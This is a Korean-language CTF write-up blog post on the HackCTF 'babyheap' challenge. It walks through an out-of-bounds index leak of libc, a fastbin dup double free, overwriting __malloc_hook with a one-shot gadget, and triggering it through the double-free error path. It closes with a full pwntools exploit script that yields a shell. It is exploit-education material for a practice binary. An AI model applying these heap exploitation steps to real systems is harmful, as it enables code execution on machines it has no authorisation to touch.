---
layout: post
title:  "HackCTF babyheap write-up"
date:   2020-03-18 19:45:55
image:  hackctf_babyheap.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled.png)

이번 문제는 PIE를 제외하고는 전부다 걸려있다. Full RELRO이기 때문에 Got overwrite가 불가능하다. 문제자체가 babyheap이기 때문에 힙관련 문제인것 같다.
<br><br><br>


**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%201.png)

예상했던데로 힙 관련 프로그램이다. 1번 메뉴를 통해 원하는 사이즈를 입력받고 데이터를 삽입한다. 2번 메뉴는 free가 진행되고, 3번 메뉴를 통해 저장한 데이터의 확인이 가능하다.
<br><br><br>


**3) 코드흐름 파악**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%202.png)

메인은 간단하다. 반복문을 돌면서 메뉴에 따른 동작이 진행된다. malloc 관련 함수는 Malloc에서 수행되고, free 관련 함수는 Free에서 수행된다. 마지막 Show 함수를 통해 출력물을 확인가능하다

<br><br><br>

1. **Malloc()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%203.png)

    scanf로 원하는 사이즈를 입력받는다. 그리고 해당 사이즈에 맞게 malloc을 진행하고 해당 주소를 ptr 배열에 복사한다. ptr배열은 총 6바이트 크기로써 전역변수에 저장되어 있다. 따라서 최대 6개의 malloc을 호출가능하다.
<br><br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%204.png)

    위 사진이 .bss영역에 저장되어 있는 ptr[6] 배열이다

    read함수를 이용하여 해당 영역에 입력한 사이즈만큼 받는다.

<br><br><br>

2. **Free()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%205.png)

    아까 ptr[6]에 차례대로 동적할당 받은 주소가 들어간다고 했다. 따라서 인덱스 0~5 까지 주소가 들어갈텐데, Free 함수에서 원하는 인덱스를 선택하여 free를 시킬수 있다.

<br><br><br>

3. **Show()**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%206.png)

    ptr의 인덱스를 선택하여 저장된 데이터를 확인하는 Show 함수이다. 9라인을 보면 입력한 인덱스가 0보다 작고, 5보다 크면 exit으로 빠지는데 0보다 작고 5보다 큰 수는 이세상에 없다.ㅋ

    사실 && 연산이 아니라 || 연산이 되야하는데 일부러 이렇게 준것같다. v1은 signed int 형이므로 음수가 입력가능하다. 따라서 OOB가 발생하여 임의의 주소를 leak이 가능하다.




<br><br><br><br>
### 2. 접근방법

---

일단 Show() 함수를 이용하여 libc 주소를 Leak 할수 있다.

    gdb-peda$ disas Show
    Dump of assembler code for function Show:
    ...
    0x0000000000400af2 <+85>:	mov    eax,DWORD PTR [rbp-0xc]
    0x0000000000400af5 <+88>:	cdqe
    0x0000000000400af7 <+90>:	  mov    rax,QWORD PTR [rax*8+0x602060]
    0x0000000000400aff <+98>:	  mov    rdi,rax
    0x0000000000400b02 <+101>:	call   0x400738 # call puts
    ...

위 코드는 Show함수의 puts 함수의 인자를 넣는 부분이다. rax*8+0x602060에 들어있는 값을 rax에 복사하고 이를 다시 rdi에 넣고 puts를 호출한다.

ptr의 시작주소는 0x602060이고 이는 8바이트 단위의 배열이기때문에 rax*에 8을 곱한다.
<br><br><br>
rax에는 현재 scanf로 입력한 ptr의 인덱스 값이 들어가 있다.

우리가 현재 필요한 값은 다음의 값이다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%207.png)
<br><br>
아이다에서 .LOAD 영역에 Elf64_Rela 데이터들을 확인할 수 있다. 

    **Elf64_Rela란?**
    
    Dynamic Linking 방식으로 컴파일이 된 ELF 바이너리는 공유 라이브러리 내에 위치한 함수의 주소를 
    동적으로 알아오기 위해 GOT(Global Offset Table) 테이블을 이용한다.
    static Linking 방식은 컴파일시 모든 라이브러리의 주소가 박히게 되지만, 동적 링킹 방식은 
    해당 함수가 호출될때 plt, got를 이용하여 그때그때 필요 라이브러지 주소를 얻게된다.
    
    이러한 방식을 Lazy binding이라고 한다. EL이때 사용되는 구조체중 하나이다.
    dlsms 함수의 재배치 정보를 가지며, _dl_runtime_resolve() 에서 참조된다.
    
<br>
결국 아이다에서 LOAD 영역에 있는 elf64_Rela puts 주소를 puts의 인자로 주게되면, 해당 주소에는 puts_got의 주소가 들어가있게 되고 puts가 호출되면 puts_got에 들어있는 puts의 libc 주소를 leak할 수 있게 된다.



1. **libc주소 leak하기**
    - elf64_rela 주소 : 0x4005a8
    - rax*8+0x602060(ptr주소) = 0x4005a8(elf64_rela puts 주소)이 되게하기 위해서는

        " **rax = ( elf64_reala puts - ptr 주소 ) / 8** "값을 scanf시 입력하면 된다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%208.png)

    위 과정을 통해 put_addr의 주소를 얻을 수 있고, 이를 이용하여 libc_base 주소를 알수 있다.<br><br>
2. **fastbin dup attack (**glibc 2.23기준으로 설명)

    우리는 사용하려는 기법은 fastbin dup 이라는 기법이다.  fastbin의 구조를 안다는 전제하에 설명을 하겠다.

    일반적으로 fastbin에 들어가는 청크들은 특별한 경우를 제외하고는 병합을 하지 않는다는 특징이 있다. 또한 A라는 청크를 free시키고 연속으로 다시 A를 free시키면 내부 체크로직에 의해서 강제종료가 된다. (아래 사진이 코드임)

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%209.png)
<br><br>
    하지만 A와 B 두개의 청크가 있을때 , free(A) → free(B) → free(A) 이렇게 free를 시키면 위 코드의 safety check 로직을 우회할수 있다.
<br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2010.png)

    위 상황은 현재 malloc 을 통해 A와 B 청크를 받고, Free(A), Free(B) 를 상태이다.

    B청크의 fd는 A청크는 정상적으로 A를 가리키고 있다. (A와 B는 모두 malloc(10)으로 호출)
<br><br>
    헌데 여기서 만약 free(A)를 다시 호출하게 된다면 fastbin에는 A→B→A 이렇게 리스트가 연결될 것이다.
<br><br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2011.png)

    A가 다시 free 되어서 fastbin에 들어오게되었고, A의 fd가 B를 가리키고, B의 fd가 다시 A를 가리키는 비정상적인 상황이 되었다. 
<br><br>
    여기서 만약 동일한 사이즈(10)로 다시 malloc이 호출된다면, fastbin의 LIFO 구조로 인해 A청크를 다시 재할당해줄것이다. 그리고 해당 청크에 AAAA 데이터를 써보자
<br><br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2012.png)

    아까 A→B→A 이 구조에서 A를 재할당해서 AAAA를 입력하고 엔터를 누른 상태이다.

    A의 청크의 mem영역에 4개의 A(0x41)와 엔터의 아스키인 0xa가 들어가 있다.

    원래대로라면 fastbin list가 B→A 이렇게 되야하는데, 해당 mem영역에 데이터를 입력했기때문에 현재 A청크의 fd를 0xa41414141로 착각하여 리스트로 연결되어 있다.
<br><br><br>
    따라서 invalid memory라고 되어있다. 하지만 종료는 안돼니 그냥 진행하면된다.

    결국 우리가 알아낸것은, A→B→A 순으로 free를 시키고 malloc을 동일사이즈로 한번더하게되면, 반환받은 청크에 입력한 데이터가 다시 fastbin으로 들어간다는 것이다.

    따라서 " B→A→우리가입력한 값 " 이렇게 되어있는 상태에서 동일 사이즈로 malloc을 3번 호출하게되면, 첫번째로 B가 재할당되고, 두번째로 A가 재할당되고, 마지막으로 우리가 입력한 값 부분을 재할당 하게 된다.
<br><br><br>
    이 "우리가입력한 값" → 이 부분을 fake chunk 형태가 되는 주소로 입력하게 된다면 성공이다. 현재 바이너리에 FULL RELO가 걸려있으므로 GOT_Overwrite가 안된다. 따라서 다른 방법을 이용해야하는데, 바로  _malloc_hook함수를 이용하면 된다.<br><br><br>

3.  **_malloc_hook 이용하기**

    _malloc_hook함수란 내부적으로 malloc 코드가 동작할때 초반에 체킹되는 로직으로, 일반적으로 개발자를 위한 디버깅함수라고 알면된다. 보통은 해당 함수의 반환값이 널로 되어있어서 정상적인 malloc이 호출된다 (아래 코드부분)

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2013.png)

    하지만 null 값이 아니면 정상적인 malloc이 호출되는 것이 아닌, 개발자가 세팅해놓은 관련함수를 호출하게 된다. 따라서 개발자의 디버깅을 위한 함수라고 하는것 같다.

    쨋든 1번 을 통해 libc_base 주소를 구했으므로, malloc_hook주소도 구할수 있다. 해당 malloc_hook함수의 주소를 아까 AAAA라고 입력했던 로직에서 대신 주고 주면 된다. 그렇게되면 fastbin에는 다음과 같이 리스트가 구성될 것이다.

    - **B→A→malloc_hook주소**

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2014.png)

    하지만 여기서 알아야 할 것은. 그냥 바로 malloc_hook 함수의 주소 그대로를 넣으면 안됀다. 왜냐하면 청크의 구조에 맞아야지 재할당이 될때 에러가 안난다. 따라서 malloc_hook -35 위치의 주소를 입력할것이다.<br><br><br>

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2015.png)

위 사진은 malloc_hook 함수 부분이다. 빨간 동그라미가 청크사이즈 부분인데 0이 들어가 있으므로, 해당 주소 대신 -35 주소를 줘야한다<br><br>

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2016.png)

-35 주소를 부분 0x7f 라고 청크 사이즈로 둔갑가능한 값이 들어가 있다. 따라서 해당 malloc_hook-35 주소를 입력하면된다.  

    **참고 !!**
    추가적으로 요 0x7f을 사이즈로 둔갑할 것이기 때문에 요청사이즈는 청크헤더 포함 0x70 ~ 0x7f 사이의
    값이 되야한다. 따라서 malloc으로 요청하는 사이즈는 0x59 ~ 0x68 사이의 값으로 요청해야 
    위 헤더가 포함됬을 때 0x70 ~ 0x7f 사이의 청크 사이즈가 되기 때문이다.

쨋든 그렇게 된다면 "malloc_hook-35" 주소의 청크가 재할당된다면 실제 데이터는 청크헤더를 뺀 위치에 저장되므로 

fastbin :: B → A → "malloc_hook-35"

이 상태에서 3번 malloc을 진행하면 "malloc_hook-35" 주소의 청크를 할당받고 해당 부분의 mem 영역은 -19에 위치해 있으므로 3번 malloc할때 더미값 19개를 준뒤 원샷 가젯을 넣으면 된다.<br><br>

    **원샷 가젯이란?**
    
    일반적으로 GOP 진행할때 /bin/sh 주소 구하고, 이를 넣고, 시스템함수나 execve 호출하고 ~~ 등등
    의 과정을 일일히 해줘야하지만 이러한 과정을 내부적으로 구현한 것을 바로 원샷가젯이라고 한다
    따라서 원샷가젯 주소가 호출만 된다면, 바로 쉘이 떨어진다. 설치방법과 사용방법은 
    인터넷에 널려있다

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20babyheap/Untitled%2017.png)

위 상황은 마지막 "malloc_hook-35" 을 재할당받고 해당 위치에 더미값 19개와 원샷 가젯을 입력한 상태이다. 0x45 더미값 19개가 들어갔고, 원샷가젯이 빨간동그라미부분이다.
<br><br><br>
이제 다시한번 malloc을 호출하여 malloc_hook이 호출내면 원샷가젯이 실행될 것이다.

하지만 malloc은 최대6개까지 밖에 호출을 못한다. 따라서 더이상 malloc은 불가능하다. 따라서 다른 방법을 이용해야한다.


<br><br>
- **double free 버그 이용하기 !**

    아까 동일한 청크를 연속으로 free 시키면 double free 버그가 난다고 했다. 이를 이용하면 된다. 무슨 말이냐면, double free 버그가 일어나서 실행되는 내부 로직에서 malloc이 한번 호출되기 때문에 malloc 내부에 존재하는 malloc_hook 함수가 실행된다는 소리이다.

        => **doble free error backtrace**
        
        13 0x00007ffff7a2c9f0 in backtrace_and_maps
        12 __GI___backtrace 0x7ffff7a2c9f0
        11 0x00007ffff7b22bc1
        10 __GI___libc_dlopen_mode
        9  0x00007ffff7b50664 in dlerror_run
        8  0x00007ffff7de7574 in _dl_catch_error
        7  0x00007ffff7b505ad in do_dlopen 
        6  0x00007ffff7debdb9 in _dl_open
        5  0x00007ffff7de7574 in _dl_catch_error 
        4  0x00007ffff7dec587 in dl_open_worker
        3  0x00007ffff7de0169 in _dl_map_object 
        2  0x00007ffff7def5ef in _dl_load_cache_lookup
        1  0x00007ffff7df3eda in __strdup
        0  __GI___libc_malloc

위의 호출과정을 통해서 결국 _strdup 내부에서 __libc_malloc을 호출한다.<br><br><br>

    [-------------------------------------code-------------------------------------]
       0x7ffff7df3ec5 <__strdup+5>:	sub    rsp,0x8
       0x7ffff7df3ec9 <__strdup+9>:	call   0x7ffff7df3f10 <strlen>
       0x7ffff7df3ece <__strdup+14>:	lea    rbx,[rax+0x1]
    => 0x7ffff7df3ed2 <__strdup+18>:	mov    rdi,rbx
       0x7ffff7df3ed5 <__strdup+21>:	call   0x7ffff7dd7a80 <malloc@plt> **#여기!!!!!!!**
       0x7ffff7df3eda <__strdup+26>:	test   rax,rax
       0x7ffff7df3edd <__strdup+29>:	je     0x7ffff7df3ef8 <__strdup+56>
       0x7ffff7df3edf <__strdup+31>:	add    rsp,0x8
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffc960 --> 0x3473bc00 
    0008| 0x7fffffffc968 --> 0x7ffff7fd2857 ("/lib/x86_64-linux-gnu/libgcc_s.so.1")
    0016| 0x7fffffffc970 --> 0x7fffffffca30 --> 0x0 
    0024| 0x7fffffffc978 --> 0x7ffff7def5ef (<_dl_load_cache_lookup+1375>:	lea    rsp,[rbp-0x28])
    0032| 0x7fffffffc980 ("/lib/x86_64-linux-gnu/libgcc_s.so.1")
    0040| 0x7fffffffc988 ("_64-linux-gnu/libgcc_s.so.1")
    0048| 0x7fffffffc990 ("x-gnu/libgcc_s.so.1")
    0056| 0x7fffffffc998 ("bgcc_s.so.1")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    42	in strdup.c
    gdb-peda$ bt
    #0  __strdup (s=0x7fffffffc980 "/lib/x86_64-linux-gnu/libgcc_s.so.1")
        at strdup.c:42
    #1  0x00007ffff7def5ef in _dl_load_cache_lookup (
        name=name@entry=0x7ffff7b99686 "libgcc_s.so.1") at dl-cache.c:311
    #2  0x00007ffff7de0169 in _dl_map_object (loader=loader@entry=0x7ffff7fdb000, 
        name=name@entry=0x7ffff7b99686 "libgcc_s.so.1", type=type@entry=0x2, 
        trace_mode=trace_mode@entry=0x0, mode=mode@entry=0x90000001, 
        nsid=<optimized out>) at dl-load.c:2364
    #3  0x00007ffff7dec587 in dl_open_worker (a=a@entry=0x7fffffffd070)
        at dl-open.c:237
    #4  0x00007ffff7de7574 in _dl_catch_error (
        objname=objname@entry=0x7fffffffd060, 
        errstring=errstring@entry=0x7fffffffd068, 
        mallocedp=mallocedp@entry=0x7fffffffd05f, 
        operate=operate@entry=0x7ffff7dec4e0 <dl_open_worker>, 
        args=args@entry=0x7fffffffd070) at dl-error.c:187
    #5  0x00007ffff7debdb9 in _dl_open (file=0x7ffff7b99686 "libgcc_s.so.1", 
        mode=0x80000001, caller_dlopen=0x7ffff7b22bc1 <__GI___backtrace+193>, 
        nsid=0xfffffffffffffffe, argc=<optimized out>, argv=<optimized out>, 
        env=0x7fffffffdd98) at dl-open.c:660
    #6  0x00007ffff7b505ad in do_dlopen (ptr=ptr@entry=0x7fffffffd290)
        at dl-libc.c:87
    #7  0x00007ffff7de7574 in _dl_catch_error (objname=0x7fffffffd280, 
        errstring=0x7fffffffd288, mallocedp=0x7fffffffd27f, 
        operate=0x7ffff7b50570 <do_dlopen>, args=0x7fffffffd290) at dl-error.c:187
    #8  0x00007ffff7b50664 in dlerror_run (args=0x7fffffffd290, 
        operate=0x7ffff7b50570 <do_dlopen>) at dl-libc.c:46
    #9  __GI___libc_dlopen_mode (name=name@entry=0x7ffff7b99686 "libgcc_s.so.1", 
        mode=mode@entry=0x80000001) at dl-libc.c:163
    #10 0x00007ffff7b22bc1 in init () at ../sysdeps/x86_64/backtrace.c:52
    #11 __GI___backtrace (array=array@entry=0x7fffffffd2f0, size=size@entry=0x40)
        at ../sysdeps/x86_64/backtrace.c:105
    #12 0x00007ffff7a2c9f5 in backtrace_and_maps (do_abort=<optimized out>, 
        do_abort@entry=0x2, written=<optimized out>, fd=fd@entry=0x3)
        at ../sysdeps/unix/sysv/linux/libc_fatal.c:47
    #13 0x00007ffff7a847e5 in __libc_message (do_abort=do_abort@entry=0x2, 
        fmt=fmt@entry=0x7ffff7b9ded8 "*** Error in `%s': %s: 0x%s ***\n")
        at ../sysdeps/posix/libc_fatal.c:172
    #14 0x00007ffff7a8d37a in malloc_printerr (ar_ptr=<optimized out>, 
        ptr=<optimized out>, 
        str=0x7ffff7b9dfa0 "double free or corruption (fasttop)", action=0x3)
        at malloc.c:5006
    #15 _int_free (av=<optimized out>, p=<optimized out>, have_lock=0x0)
        at malloc.c:3867
    #16 0x00007ffff7a9153c in __GI___libc_free (mem=<optimized out>)
        at malloc.c:2968
    #17 0x0000000000400a86 in Free ()
    #18 0x0000000000400b5e in main ()
    #19 0x00007ffff7a2d830 in __libc_start_main (main=0x400b1e <main>, argc=0x1, 
        argv=0x7fffffffdd88, init=<optimized out>, fini=<optimized out>, 
        rtld_fini=<optimized out>, stack_end=0x7fffffffdd78)
        at ../csu/libc-start.c:291
    #20 0x00000000004007b9 in _start ()
    
 
<br>
따라서 마지막에 같은 인덱스 free를 2번 해주면 끝이다.


<br><br><br><br><br>


### 3. 풀이

---

최종 익스코드는 다음과 같다.
```python
from pwn import *
context.log_level="DEBUG"
#p=remote("ctf.j0n9hyun.xyz",3030)
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
p=process("././babyheap")
gdb.attach(p)

ptr_adr=0x602060
put_rela=0x4005a8
libc=ELF("./libc.so.6")

def malloc(size,context):
    p.sendafter("> ","1")
    p.sendlineafter("size: ",str(size))
    p.sendafter("content: ",context)

def free(index):
    p.sendafter("> ","2")
    p.sendlineafter("index: ",str(index))

def show(index):
        p.sendafter("> ","3")
        p.sendlineafter("index: ",str(index))


show((put_rela-ptr_adr)/8)

put_addr=u64(p.recv(6)+"\x00\x00")
libc_base=put_addr-libc.symbols['puts']
malloc_hook=libc_base+libc.symbols['__malloc_hook']
log.info("put_addr::"+hex(put_addr))
log.info(hex(libc_base))
log.info(hex(malloc_hook))
malloc(89,"A"*8)
malloc(89,"B"*8)

free(0)
free(1)
free(0)

malloc(89,p64(malloc_hook-35))
malloc(89,"C"*8)
malloc(89,"D"*8)
malloc(89,"E"*19+p64(libc_base+0xf02a4))
pause()
free(2)
pause()
free(2)
p.interactive()
```


<br><br><br>

### 4. 몰랐던 개념

---

힙 관련 문제중 쉬운 편인 fastbin dup을 풀어봤다. 확실히 힙 공부를 먼저 해놔서 이해가 쉽게 되었다.

이번 문제를 통해 새롭게 알게 된 사실은 double free error시 malloc이 호출된다는 사실이다.

(그냥 free 일때도 호출하는지 확인해봐야겠다..ㅋ)  **⇒ 일반적인 free에서는 안하는 듯 ㅋ**

이제 힙 문제로 떠나보자.